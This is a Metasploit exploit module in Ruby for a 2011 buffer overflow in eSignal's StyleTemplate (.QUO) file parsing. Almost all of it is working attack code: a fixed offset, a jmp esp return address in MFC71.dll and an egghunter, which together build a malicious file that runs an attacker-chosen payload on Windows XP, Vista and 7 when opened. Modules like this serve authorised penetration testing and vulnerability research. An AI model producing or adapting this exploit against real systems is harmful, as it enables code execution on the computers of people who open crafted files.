##
# $Id: esignal_styletemplate_bof.rb 13765 2011-09-20 17:39:53Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Egghunter
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'eSignal and eSignal Pro <= 10.6.2425.1208 file parsing buffer overflow in QUO',
            'Description'    => %q{
                The software is unable to handle the "<StyleTemplate>" files (even
                those original included in the program) like those with the registered
                extensions QUO, SUM and POR. Successful exploitation of this vulnerability
                may take up to several seconds due to the use of egghunter.  Also, DEP
                bypass is unlikely due to the limited space for payload.
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'Luigi Auriemma',                          # Original discovery
                    'TecR0c <tecr0c[at]tecninja.net>',         # msf
                    'mr_me <steventhomasseeley[at]gmai.com>',  # msf
                ],
            'Version'       => '$Revision: 13765 $',
            'References'    =>
                [
                    #[ 'CVE', '?' ],
                    #[ 'OSVDB', '?' ],
                    [ 'BID', '49600' ],
                    [ 'URL', 'http://aluigi.altervista.org/adv/esignal_1-adv.txt' ],
                    [ 'URL', 'http://www.exploit-db.com/exploits/17837/' ]
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                    'InitialAutoRunScript' => 'migrate -f',
                },
            'Platform'       => 'win',
            'Payload'        =>
                {
                    'Space'    => 1000,
                    'BadChars' => "\x00"
                },
 
            'Targets'        =>
                [
                    [
                        'Win XP SP3 / Windows Vista / Windows 7',
                        {
                            'Ret'     =>  0x7c206fef, # jmp esp MFC71.dll v10.6.2425.1208
                            'Offset'  =>  54
                        }
                    ],
                ],
            'Privileged'     => false,
            'DisclosureDate' => 'Sep 06 2011',
            'DefaultTarget'  => 0))
 
        register_options(
            [
                OptString.new('FILENAME', [ false, 'The file name.', 'msf.quo']),
            ], self.class)
 
    end
 
    def exploit
        eggoptions =
        {
            :checksum => false,
            :eggtag => 'eggz'
        }
 
        hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)
 
        buffer =  rand_text_alpha(target['Offset'])
        buffer << [target.ret].pack('V')
        buffer << rand_text_alpha_upper(4)
        buffer << hunter
        buffer << rand_text_alpha_upper(1500)
        buffer << egg
 
        file = "<StyleTemplate>\r\n"
        file << "#{buffer}\r\n"
        file << "</StyleTemplate>\r\n"
 
        print_status("Creating '#{datastore['FILENAME']}' file ...")
        file_create(file)
    end
end
